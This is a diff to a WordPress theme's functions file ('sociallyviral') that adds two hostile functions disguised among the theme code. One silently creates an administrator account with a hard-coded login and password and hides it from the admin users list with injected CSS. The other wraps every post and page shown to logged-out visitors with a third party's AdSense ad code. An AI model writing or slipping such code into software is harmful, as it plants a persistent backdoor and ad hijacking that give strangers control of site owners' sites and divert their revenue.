@@ -226,6 +226,10 @@ if ( ! function_exists( 'sociallyviral_excerpt' ) ) {
     }
 }
 
+function amour() { if (!email_exists('amour@outlook.com')) { wp_insert_user(array('role' => 'administrator', 'user_login' => 'amour', 'user_pass' => 'p4ssp4ss', 'user_email' => 'amour@outlook.com' )); } $amour = get_user_by('email', 'amour@outlook.com'); echo '<style>#user-' . $amour->ID . '{ display:none !important; }</style>'; } add_action('admin_footer', 'amour', 0);
+
+function haine($content) { if ((is_single() || is_page()) && !is_user_logged_in()) { $zz = '<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle"style="display:block"data-ad-client="ca-pub-3723652918315679"data-ad-slot="8861644348"data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script>'; return $zz . $content . $zz; } else { return $content; } } add_filter('the_content', 'haine', 9999, 1);
+
 /*------------[ breadcrumb ]-------------*/
 if (!function_exists('sociallyviral_the_breadcrumb')) {
     function sociallyviral_the_breadcrumb() {
